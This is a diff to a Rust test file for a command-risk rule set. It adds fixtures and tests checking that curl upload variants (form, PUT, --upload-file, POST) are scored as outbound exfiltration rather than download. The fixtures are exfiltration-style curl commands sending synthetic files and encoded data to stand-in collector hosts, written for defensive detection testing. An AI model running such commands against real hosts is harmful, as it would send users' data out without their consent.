@@ -21,8 +21,16 @@ const LEADING_SPECIAL_BODY: &str = "curl --data +AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 const URL_THEN_ENCODED_DATA: &str = "curl https://collector.example.invalid/upload --data dGVsbHRhbGUtc3ludGhldGljLWV4ZmlsLW1hcmtlcg==";
 const PATH_WITH_DATA_SUBSTRING: &str = "curl https://api.example.invalid/user-data";
 const FAIL_FLAG_RETRIEVAL: &str = "curl -f https://packages.example.invalid/tool.tar.gz";
+const DUMP_HEADERS_RETRIEVAL: &str = "curl -D- https://packages.example.invalid/tool.tar.gz";
 const FORM_UPLOAD: &str = "curl --form payload=@synthetic https://api.example.invalid/upload";
+const COMPACT_FORM_UPLOAD: &str = "curl -Fpayload=@synthetic https://api.example.invalid/upload";
 const OBJECT_STORE_UPLOAD: &str = "aws s3 cp dist/app.tar.gz s3://example-invalid/artifacts/";
+const UPLOAD_FILE: &str =
+    "curl --upload-file synthetic.bin https://collector.example.invalid/upload";
+const EXPLICIT_PUT: &str = "curl -X PUT synthetic.bin https://collector.example.invalid/upload";
+const REQUEST_PUT: &str = "curl --request PUT https://collector.example.invalid/upload";
+const METHOD_POST: &str = "curl --method=post https://collector.example.invalid/upload";
+const TAB_SEPARATED_POST: &str = "curl -x\tpost https://collector.example.invalid/upload";
 
 fn bundled() -> CompiledRuleSet {
     load_default_rule_set().expect("bundled rules")
@@ -287,9 +295,34 @@ fn fail_flag_retrieval_is_not_form_upload() {
 }
 
 #[test]
+fn dump_headers_flag_retrieval_is_not_data_upload() {
+    let result = evaluate(&[("arguments", DUMP_HEADERS_RETRIEVAL)]).expect("match");
+    assert!(has_rule(&result, "network.download"));
+    assert!(!has_rule(&result, "exfil.outbound_upload"));
+    assert_eq!(result.score, 20);
+}
+
+#[test]
 fn form_upload_is_upload_not_download() {
-    let result = evaluate(&[("arguments", FORM_UPLOAD)]).expect("match");
-    assert!(has_rule(&result, "exfil.outbound_upload"));
-    assert!(!has_rule(&result, "network.download"));
-    assert_eq!(result.score, 60);
+    for command in [FORM_UPLOAD, COMPACT_FORM_UPLOAD] {
+        let result = evaluate(&[("arguments", command)]).expect("match");
+        assert!(has_rule(&result, "exfil.outbound_upload"), "{command}");
+        assert!(!has_rule(&result, "network.download"), "{command}");
+        assert_eq!(result.score, 60);
+    }
+}
+
+#[test]
+fn upload_file_and_explicit_methods_are_upload_not_download() {
+    for command in [
+        UPLOAD_FILE,
+        EXPLICIT_PUT,
+        REQUEST_PUT,
+        METHOD_POST,
+        TAB_SEPARATED_POST,
+    ] {
+        let result = evaluate(&[("arguments", command)]).expect("match");
+        assert!(has_rule(&result, "exfil.outbound_upload"), "{command}");
+        assert!(!has_rule(&result, "network.download"), "{command}");
+    }
 }
